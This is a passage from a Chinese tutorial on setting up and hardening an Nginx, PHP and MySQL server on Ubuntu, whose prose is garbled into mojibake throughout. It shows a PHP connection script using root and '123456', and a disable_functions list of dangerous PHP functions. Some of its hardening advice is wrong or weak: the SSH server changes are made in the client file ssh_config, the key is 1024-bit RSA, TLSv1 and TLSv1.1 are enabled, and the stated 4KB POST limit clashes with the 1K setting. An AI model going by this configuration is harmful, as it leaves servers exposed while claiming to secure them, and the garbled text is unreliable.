class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><p>ç„¶åå’Œä¸Šé¢ä¸€æ ·ï¼ŒæˆåŠŸè®¿é—®<code>127.0.0.1/phpinfo.php</code>åˆ™è¯´æ˜nginxå·²ç»èƒ½å¤Ÿæ”¯æŒPHP</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805122750141.png" alt="image-20210805122750141"></p><h1 id="0x05-PHPè¿æ¥MySQL"><a href="#0x05-PHPè¿æ¥MySQL" class="headerlink" title="0x05 PHPè¿æ¥MySQL"></a>0x05 PHPè¿æ¥MySQL</h1><p>æ–¹å¼ï¼šé€šè¿‡MySQLiæ‰©å±•</p><p>å®‰è£…mysqliæ‰©å±•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.4-mysqli</span><br></pre></td></tr></table></figure><p>åœ¨<code> /var/www/html/</code>ç›®å½•ä¸‹åˆ›å»º<code>connect.php</code>ï¼Œç¼–è¾‘å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> = <span class="string">&#x27;localhost&#x27;</span>; <span class="comment">// mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€</span></span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;root&#x27;</span>;  <span class="comment">// mysqlç”¨æˆ·å</span></span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;123456&#x27;</span>; <span class="comment">// mysqlç”¨æˆ·å¯¹åº”çš„å¯†ç </span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="variable">$conn</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æ•°æ®åº“è¿æ¥æˆåŠŸ!&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select user,host from mysql.user&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// è¾“å‡ºæ•°æ®</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;user&quot;</span>].<span class="string">&quot;@&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;host&quot;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 ç»“æœ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span>        </span><br></pre></td></tr></table></figure><p>è®¿é—®<code>127.0.0.1/connect.php</code>,é¡µé¢ä¸Šå³å‡ºç°â€œæ•°æ®åº“è¿æ¥æˆåŠŸï¼â€ï¼Œå¹¶æ‰§è¡Œmysqlè¯­å¥ï¼Œè¿”å›äº†æŸ¥è¯¢çš„æ•°æ®ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805143905647.png" alt="image-20210805143905647"></p><h1 id="0x06-å®‰å…¨åŠ å›º"><a href="#0x06-å®‰å…¨åŠ å›º" class="headerlink" title="0x06 å®‰å…¨åŠ å›º"></a>0x06 å®‰å…¨åŠ å›º</h1><h2 id="åŠ å›ºLinuxç³»ç»Ÿ"><a href="#åŠ å›ºLinuxç³»ç»Ÿ" class="headerlink" title="åŠ å›ºLinuxç³»ç»Ÿ"></a>åŠ å›ºLinuxç³»ç»Ÿ</h2><p><strong>è¿œç¨‹ç™»é™†</strong></p><p>åœ¨ä½¿ç”¨å’Œç®¡ç†æœåŠ¡å™¨æ—¶ï¼Œå¾€å¾€æˆ‘ä»¬éœ€è¦è¿œç¨‹ç™»é™†æœåŠ¡å™¨ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬ä¿è¯è¿œç¨‹ç™»é™†è¿‡ç¨‹çš„å®‰å…¨æ€§ã€‚ä»¥ä¸‹æ­¥éª¤ä¸€å®šç¨‹åº¦æé«˜äº†è¿œç¨‹ç™»é™†çš„å®‰å…¨æ€§ã€‚</p><ol><li>å¼ºåˆ¶ä½¿ç”¨é«˜å¼ºåº¦ç”¨æˆ·å¯†ç ï¼ˆæ•°å­—ã€å­—æ¯ã€å­—ç¬¦çš„ç»„åˆä¸”é•¿åº¦14ä½ä»¥ä¸Šï¼‰</li><li>æ›´æ”¹ SSH é»˜è®¤çš„ç«¯å£ï¼ˆ22ï¼‰ä¸ºéšæœºç«¯å£</li><li>ç¦æ­¢ root èº«ä»½çš„è¿œç¨‹ç™»é™†</li><li>ä½¿ç”¨å…¬é’¥è®¤è¯æœºåˆ¶è¿›è¡Œè¿œç¨‹ç™»é™†</li><li>ä½¿ç”¨ Linux æ ‡å‡†ç”¨æˆ·è€Œä¸æ˜¯ root ç”¨æˆ·æ‰§è¡Œä¸Šè¿°æ“ä½œï¼Œå¹¶ä¸”è¯¥ç”¨æˆ·çš„æƒé™å¯æå‡æˆ root æƒé™</li></ol><p>ç°ä»¥ Ubuntu ç³»ç»Ÿä¸ºä¾‹ï¼Œå®Œæˆä¸Šè¿°æ“ä½œï¼š</p><p>è¦å¼ºåˆ¶ç”¨æˆ·<strong>ä½¿ç”¨é«˜å¼ºåº¦å¯†ç </strong>ï¼Œéœ€è¦å®‰è£…é¢å¤–çš„æ¨¡å— <code>libpam-cracklib</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libpam-cracklib</span><br></pre></td></tr></table></figure><p>åœ¨ Ubuntu ä¸­ï¼Œå¯†ç ç­–ç•¥ï¼ˆè§„å®šå¯†ç çš„é•¿åº¦ï¼Œå­—ç¬¦ç­‰ï¼‰å®šä¹‰åœ¨ <code>/etc/pam.d/common-password</code> æ–‡ä»¶ä¸­ï¼Œå¦‚æœè¦è§„å®šï¼Œå¯†ç é•¿åº¦ä¸º 14ï¼ŒåŒ…å«å¤§å°å†™å­—ç¬¦æ•°å­—å’Œå­—ç¬¦ï¼Œåœ¨æ–‡ä»¶ä¸­ï¼Œåœ¨ <code>pam_unix.so</code>çš„å‰ä¸€è¡Œï¼Œæ·»åŠ ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password required pam_cracklib.so try_first_pass retry&#x3D;3 minlen&#x3D;14 lcredit&#x3D;-1 ucredit&#x3D;-1 dcredit&#x3D;-1 ocredit&#x3D;-1 difok&#x3D;2 reject_username</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°é…ç½®çš„é€‰é¡¹çš„æè¿°å¦‚ä¸‹ï¼Œè¯¦æƒ…å‚è€ƒ <a href="http://www.linux-pam.org/Linux-PAM-html/sag-pam_cracklib.html">libpam-cracklib æ–‡æ¡£</a>ï¼š</p><table><thead><tr><th>é€‰é¡¹</th><th>æè¿°</th></tr></thead><tbody><tr><td>retry=N</td><td>è®¾ç½®å¯†ç æ—¶çš„ï¼Œæœ€å¤§é‡è¯•æ¬¡æ•°</td></tr><tr><td>minlen=N</td><td>æ–°å¯†ç çš„æœ€å°é•¿åº¦</td></tr><tr><td>lcredit=N</td><td>æœ€å°‘å°å†™å­—æ¯æ•°ï¼Œå°äº0ï¼Œæ­£å¸¸è®¡ç®— minlenï¼Œå¤§äº0ï¼Œè®¡ç®— minlen é¢å¤–åŠ  1</td></tr><tr><td>ucredt=N</td><td>æœ€å°‘å¤§å†™å­—æ¯æ•°ï¼Œå°äº0ï¼Œæ­£å¸¸è®¡ç®— minlenï¼Œå¤§äº0ï¼Œè®¡ç®— minlen é¢å¤–åŠ  1</td></tr><tr><td>dcredit=N</td><td>æœ€å°‘æ•°å­—çš„æ•°ï¼Œå°äº0ï¼Œæ­£å¸¸è®¡ç®— minlenï¼Œå¤§äº0ï¼Œè®¡ç®— minlen é¢å¤–åŠ  1</td></tr><tr><td>ocredit=N</td><td>æœ€å°‘å…¶å®ƒå­—ç¬¦æ•°ï¼Œå°äº0ï¼Œæ­£å¸¸è®¡ç®— minlenï¼Œå¤§äº0ï¼Œè®¡ç®— minlen é¢å¤–åŠ  1</td></tr><tr><td>difok=N</td><td>å’Œæ—§å¯†ç ä¸åŒçš„å­—ç¬¦æ•°</td></tr><tr><td>reject_username</td><td>ç¦æ­¢ç”¨æˆ·åä½œä¸ºå¯†ç </td></tr></tbody></table><p><strong>æ›´æ”¹sshé»˜è®¤ç«¯å£ï¼Œç¦æ­¢rootèº«ä»½ç™»å½•</strong>ï¼š</p><p>ä¿®æ”¹ sshçš„é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ° <code># Port 22</code> æ›´æ”¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 2222</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ° <code>#PermitRootLogin</code>ï¼Œæ›´æ”¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure><p>ä¿å­˜åé‡å¯sshæœåŠ¡ï¼Œä¸‹æ¬¡è¿œç¨‹ç™»é™†æ—¶åˆ™éœ€è¦æŒ‡å®šè¯¥ç«¯å£è¿›è¡Œç™»é™†ï¼Œè€Œä¸”æ— æ³•ä½¿ç”¨ root ç”¨æˆ·ç™»é™†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip-addr -p 2222</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨å…¬é’¥è®¤è¯æœºåˆ¶è¿›è¡Œè¿œç¨‹ç™»é™†ï¼š</strong></p><p>SSH ç™»é™† æä¾›<a href="https://www.linode.com/docs/security/authentication/use-public-key-authentication-with-ssh/">å…¬é’¥è®¤è¯æœºåˆ¶</a>çš„ç™»é™†ï¼Œå³ä¸éœ€è¦å¯†ç çš„ç™»é™†æ–¹å¼ï¼Œä½†æ˜¯éœ€è¦å®¢æˆ·ç«¯ç”Ÿæˆå…¬é’¥å’Œç§é’¥ï¼Œå¹¶å°†å…¬é’¥å‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å°†å…¬é’¥æ·»åŠ åˆ°ç›¸åº”ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ä¸­ã€‚</p><p>é¦–å…ˆå®¢æˆ·ç«¯éœ€è¦ç”Ÿæˆå¯†é’¥å¯¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨é»˜è®¤æ–‡ä»¶åï¼Œä¸€è·¯ <strong>Enter</strong> åˆ°åº•ï¼Œç”Ÿæˆçš„å¯†é’¥å¯¹æ–‡ä»¶åœ¨ <code>~/.ssh/</code> ç›®å½•ä¸‹ï¼Œå…¶ä¸­ <code>id_rsa</code> ä¸ºç§é’¥ï¼Œ<code>id_rsa.pub</code> ä¸ºå…¬é’¥ã€‚</p><p>æ¥ç€å°†å…¬é’¥æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id username@ip-addr -p portnum</span><br></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤ä¼šæŠŠå…¬é’¥æ–‡ä»¶çš„å†…å®¹ï¼Œå†™å…¥åˆ° <code>/home/username/ssh/authorized_keys</code> æ–‡ä»¶ä¸­ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨æ·»åŠ å†…å®¹ã€‚å¦‚æ­¤ä¸€æ¥å°±å¯ä»¥ä»¥ <code>username</code> çš„èº«ä»½ï¼Œä¸ä½¿ç”¨å¯†ç ç™»é™†æœåŠ¡å™¨äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2222 username@ip-addr</span><br></pre></td></tr></table></figure><h2 id="åŠ å›ºNginx"><a href="#åŠ å›ºNginx" class="headerlink" title="åŠ å›ºNginx"></a>åŠ å›ºNginx</h2><p><strong>é˜²æ­¢ä¿¡æ¯æ³„éœ²</strong></p><p>Nginx é»˜è®¤å¼€å¯ Server Tokenï¼ˆæ˜¾ç¤ºç‰ˆæœ¬å·ï¼‰ï¼Œè¿™æ ·ä½¿å¾— Nginx çš„ç‰ˆæœ¬å·å¾ˆå®¹æ˜“è¢«è·å–ï¼Œå¦‚ä¸‹å›¾ä¸ºè®¿é—®åŸŸåä¸å­˜åœ¨èµ„æºæ—¶çš„è¿”å›é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° Nginx çš„ç‰ˆæœ¬å·</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304133453502.png" alt="image-20210304133453502"></p><p>åœ¨ <code>/etc/nginx/nginx.conf</code> ä¸­ http å—ä¸­æ·»åŠ ï¼ˆå»æ‰æ³¨é‡Šå³å¯ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_tokens off</span><br></pre></td></tr></table></figure><p>å…³é—­åï¼Œè®¿é—®åŸŸåä¸‹ä¸å­˜åœ¨çš„èµ„æºï¼Œè¿”å›é¡µé¢ä¸­æ²¡æœ‰äº† Nginx çš„ç‰ˆæœ¬å· ä¿¡æ¯ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304133656320.png" alt="image-20210304133656320"></p><p><strong>å¢åŠ è®¿é—®æ§åˆ¶ç­–ç•¥</strong></p><p>Nginx å¯ä»¥ä½¿ç”¨ <code>allow</code> å’Œ <code>deny</code> æŒ‡ä»¤åœ¨é…ç½®æ–‡ä»¶ä¸­å…è®¸æˆ–ç¦æ­¢ç‰¹å®š IP çš„è®¿é—®ï¼Œ ç¼–è¾‘ Niginx é…ç½®æ–‡ä»¶ <code>/etc/nginx/conf.d/jaylen.com.conf</code>ï¼Œä¾‹å¦‚åªå…è®¸ 192.168.47.129ã€192.168.47.130 è®¿é—®æ­¤ç½‘ç«™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#  server configuration</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80; </span><br><span class="line">    listen [::]:80;</span><br><span class="line"></span><br><span class="line">    # IPs access control</span><br><span class="line">    allow 192.168.47.129;</span><br><span class="line">    allow 192.168.47.130;</span><br><span class="line">    deny all;</span><br><span class="line">        </span><br><span class="line">    root &#x2F;var&#x2F;www&#x2F;html;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ TLS åŠ å›º Nginx</strong></p><p><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">TLS</a> å¯ä»¥åŠ å¯†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šä¿¡çš„æ•°æ®ï¼Œé™ä½ä¿¡æ¯æ³„éœ²çš„é£é™©ã€‚å¯¹äºæœ¬åœ°ç½‘ç«™å¯ä»¥ä½¿ç”¨ <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">SSL è‡ªç­¾ è¯ä¹¦</a> å®ç° HTTPS è¿æ¥ã€‚å½“ç„¶åœ¨å…¬ç½‘ä¸­ä½¿ç”¨çš„ç½‘ç«™ï¼Œé€šå¸¸ä¼šä½¿ç”¨ CA è®¤è¯çš„è¯ä¹¦ï¼Œè¦å…è´¹ä½¿ç”¨ SSL è¯ä¹¦ï¼Œå¯å‚è€ƒï¼š</p><p><a href="https://www.howtoforge.com/tutorial/nginx-with-letsencrypt-ciphersuite/#step-install-letsencrypt-and-generate-certificates">How to Install Nginx with Letâ€™s encrypt and get A+ from SSLLabs Test</a></p><p>è¦åœ¨ Nginx é…ç½®è‡ªç­¾è¯ä¹¦ï¼Œé¦–å…ˆåœ¨é…ç½®ç›®å½•ä¸‹å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿›åˆ°æ–‡ä»¶å¤¹ä¸­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /etc/nginx/ssl/</span><br><span class="line"><span class="built_in">cd</span> /etc/nginx/ssl</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå¯†é’¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl genrsa -aes256 -out nginx.key 1024</span><br></pre></td></tr></table></figure><p>æ¥ç€ç”Ÿæˆ <a href="https://en.wikipedia.org/wiki/Certificate_signing_request">CSR</a>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl req -new -key nginx.key -out nginx.csr</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Enter pass phrase for nginx.key:</span><br><span class="line">Can&#39;t load &#x2F;home&#x2F;jaylen&#x2F;.rnd into RNG</span><br><span class="line">140067713049024:error:2406F079:random number generator:RAND_load_file:Cannot open file:..&#x2F;crypto&#x2F;rand&#x2F;randfile.c:88:Filename&#x3D;&#x2F;home&#x2F;jaylen&#x2F;.rnd</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#39;.&#39;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:CN </span><br><span class="line">State or Province Name (full name) [Some-State]:Guangdong</span><br><span class="line">Locality Name (eg, city) []:Guangzhou</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:IT</span><br><span class="line">Organizational Unit Name (eg, section) []:IT</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:www.jaylen.com</span><br><span class="line">Email Address []:jaylen@gmail.com</span><br><span class="line"></span><br><span class="line">Please enter the following &#39;extra&#39; attributes</span><br><span class="line">to be sent with your certificate request</span><br><span class="line">A challenge password []:admin           </span><br><span class="line">An optional company name []:IT</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œç­¾å‘è¯ä¹¦ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl x509 -req -days 365 -<span class="keyword">in</span> nginx.csr -signkey nginx.key -out nginx.crt</span><br></pre></td></tr></table></figure><p>æˆåŠŸç­¾å‘ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ignkey nginx.key -out nginx.crt</span><br><span class="line">Signature ok</span><br><span class="line">subject&#x3D;C &#x3D; CN, ST &#x3D; Guangdong, L &#x3D; Guangzhou, O &#x3D; IT, OU &#x3D; IT, CN &#x3D; www.jaylen.com, emailAddress &#x3D; jaylen@gmail.com</span><br><span class="line">Getting Private key</span><br><span class="line">Enter pass phrase for nginx.key:</span><br></pre></td></tr></table></figure><p>æ¥ç€åœ¨ <code>/etc/nginx/conf.d/jaylen.com.conf</code> ä¸­ä¿®æ”¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    ssl_certificate &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;nginx.crt;</span><br><span class="line">    ssl_certificate_key &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;nginx.key;</span><br><span class="line">    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;</span><br></pre></td></tr></table></figure><p>é‡æ–°åŠ è½½ Nginx é…ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><p>æç¤ºè¾“å…¥ä¹‹å‰æ­¥éª¤è®¾ç½®çš„å¯†ç ï¼Œè¾“å…¥å³å¯ã€‚</p><p>å…¶å®ƒåŠ å›ºæªæ–½ï¼Œå¯ä»”ç»†é˜…è¯»ï¼š</p><p><a href="https://www.cyberciti.biz/tips/linux-unix-bsd-nginx-webserver-security.html">Top 25 Nginx Web Server Best Security Practices</a></p><p><a href="https://geekflare.com/nginx-webserver-security-hardening-guide/">Nginx Web Server Security and Hardening Guide</a></p><h2 id="åŠ å›ºMySQL"><a href="#åŠ å›ºMySQL" class="headerlink" title="åŠ å›ºMySQL"></a>åŠ å›ºMySQL</h2><p>è¿è¡Œ <code>mysql_secure_installation</code> å·¥å…·ï¼ˆå®‰è£… mysql åè‡ªå¸¦çš„ shell è„šæœ¬ï¼‰ï¼Œè¿›è¡Œ mysql çš„å®‰å…¨æ£€æŸ¥ï¼Œ</p><p>æ ¹æ®æç¤ºï¼Œè®¾ç½®å¯†ç ä¸ºæœ€é«˜çº§åˆ«ï¼Œå¹¶ä¸º root ç”¨æˆ·è®¾ç½®å¯†ç ï¼Œæœ€ååŒæ„ä»¥ä¸‹é€‰é¡¹ï¼š</p><ul><li>Remove anonymous users? â€“ åˆ é™¤åŒ¿åç”¨æˆ·</li><li>Disallow root login remotely? â€“ ç¦æ­¢è¿œç¨‹ä½¿ç”¨ root ç”¨æˆ·ç™»é™†</li><li>Remove test database and access to it? â€“ åˆ é™¤æµ‹è¯•æ•°æ®åº“å’Œå…¶è®¿é—®æƒé™</li><li>Reload privilege tables now? â€“ é‡è½½æˆæƒè¡¨</li></ul><h2 id="åŠ å›ºPHP"><a href="#åŠ å›ºPHP" class="headerlink" title="åŠ å›ºPHP"></a>åŠ å›ºPHP</h2><p><strong>å½“æ–‡ä»¶ä¸å­˜åœ¨æ—¶åœæ­¢ PHP å¤„ç†</strong></p><p>Nginx å¯¹äº PHP çš„é»˜è®¤é…ç½®ä½¿å¾— PHP è§£é‡Šå™¨æ¥å—æ‰€æœ‰ä»¥ <code>.php</code>ç»“å°¾çš„ URIï¼Œè¿™æ ·ä¸€æ¥å°±ä¼šå­˜åœ¨å¾ˆå¤§çš„é£é™©ï¼Œå­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå…·ä½“è§£é‡Šè§<a href="https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/?highlight=pitfalls#passing-uncontrolled-requests-to-php">Passing Uncontrolled Requests to PHP</a></p><p>ä¿®æ”¹ <code>/etc/php/7.4/fpm/php.ini</code>æ–‡ä»¶ï¼ˆä¸åŒç³»ç»Ÿè¯¥æ–‡ä»¶ä½ç½®ç•¥æœ‰ä¸åŒï¼‰ï¼Œè®¾ç½®<code>cgi.fix_pathinfo=0</code>ï¼Œå¯ä»¥ç¦æ­¢ PHP è§£é‡Šå™¨æŸ¥æ‰¾æ–‡ä»¶ç³»ç»Ÿä¸­ä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚</p><p><strong>ç¦ç”¨å±é™©çš„ PHP å‡½æ•°</strong></p><p>å½“ä»¥ä¸‹å‡½æ•°ä¸ä½¿ç”¨æ—¶ï¼Œå¯ä¿®æ”¹ <code>php.ini</code> ä»¥ç¦ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D;exec,eval,phpinfo,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</span><br></pre></td></tr></table></figure><p><strong>é™åˆ¶æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</strong></p><p>å¦‚æœç½‘ç«™ä¸éœ€è¦æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œåº”è¯¥ç¦ç”¨ï¼Œä¿®æ”¹<code>php.ini</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_uploads&#x3D;Off</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦ä¸Šä¼ åŠŸèƒ½ï¼Œåˆ™è®¾ç½®ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œæ ¹æ®å®é™…æƒ…å†µè®¾ç½®ï¼Œå¦‚å¤´åƒå›¾ç‰‡ä¸Šä¼ 1Mè¶³çŸ£ï¼Œä¿®æ”¹<code>php.ini</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_uploads&#x3D;On</span><br><span class="line">upload_max_filesize&#x3D;1M</span><br></pre></td></tr></table></figure><p><strong>è®¾ç½® POST æ–¹æ³•ä¼ è¾“æ•°æ®çš„å¤§å°</strong></p><p>POST æ–¹æ³•æ˜¯å½“å®¢æˆ·ç«¯éœ€è¦å‘æœåŠ¡å™¨å‘é€æ•°æ®æ—¶ä½¿ç”¨çš„ï¼Œè¯¥æ–¹æ³•å¯è¢«ç”¨äºå¯¹æœåŠ¡å™¨è¿›è¡Œ Dos æ”»å‡»ç­‰ï¼Œæ‰€ä»¥éœ€è¦å°†å…¶èƒ½ä¼ è¾“çš„æ•°æ®å¤§å°è®¾ç½®æˆåˆç†çš„æ•°å€¼ï¼Œå¦‚æœç½‘ç«™ä¸éœ€è¦ä¸Šä¼ æ–‡ä»¶ç­‰æ•°æ®é‡å¤§çš„æ“ä½œï¼Œ4KBä¹Ÿåº”è¯¥è¶³å¤Ÿäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_max_size&#x3D;1K</span><br></pre></td></tr></table></figure><p><strong>é˜²æ­¢ PHP ä¿¡æ¯æ³„éœ²</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expose_php &#x3D; Off</span><br></pre></td></tr></table></figure><p><strong>é™åˆ¶ PHP è„šæœ¬çš„æœ€é•¿æ‰§è¡Œæ—¶é—´</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># set in seconds</span><br><span class="line">max_execution_time &#x3D; 30 #æœ€é•¿æ‰§è¡Œæ—¶é—´ 30 s</span><br><span class="line">max_input_time &#x3D; 30#è„šæœ¬è§£æè¾“å…¥æœ€é•¿æ—¶é—´30s</span><br><span class="line">memory_limit &#x3D; 40M #è„šæœ¬æœ€å¤§ä½¿ç”¨å†…å­˜40M</span><br></pre></td></tr></table></figure><p>è¿™æ 